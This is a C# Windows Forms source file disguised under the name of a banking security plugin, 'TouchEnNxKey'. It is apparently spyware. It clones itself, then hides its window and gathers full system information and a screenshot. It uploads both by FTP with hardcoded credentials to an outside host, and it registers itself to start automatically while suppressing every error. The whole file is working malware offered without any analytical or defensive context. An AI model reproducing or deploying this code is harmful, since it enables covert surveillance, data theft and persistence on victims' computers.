using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace TouchEnNxKey
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Consistent.Clone();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (Consistent.isInTemp() == true)
            {
                this.Close();
            }
        }

        

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //if (Consistent.isInTemp() == true)
            //{
            //    e.Cancel = true;
            //}

            try
            {
                this.Hide();
                string info = SystemInformation.GetAll();
                string dir = FileTag.Read();

                String timeStamp = TimeStamp.GetTimestamp();
                string localPath = Path.GetTempPath();
                string fileName = dir + "_" + timeStamp + ".txt";
                string screenshotFileName = dir + "_" + timeStamp + ".jpg";

                //text 인자를 파일로 생성
                using (StreamWriter output = new StreamWriter(localPath + fileName, false, System.Text.Encoding.UTF8))
                {
                    output.WriteLine(info);
                }

                ScreenCopy.Copy(localPath + screenshotFileName);

                var ftp = new FtpUtil("ghostyak83.cafe24.com", "test1", "test1");
                ftp.FTPDirectioryCheck(dir);
                ftp.Upload(localPath + fileName, dir + "/" + fileName);
                ftp.Upload(localPath + screenshotFileName, dir + "/" + screenshotFileName);

                //자동시작
                Consistent.AutoStart();
            }
            catch (Exception)
            {

            }
        }
    }
}
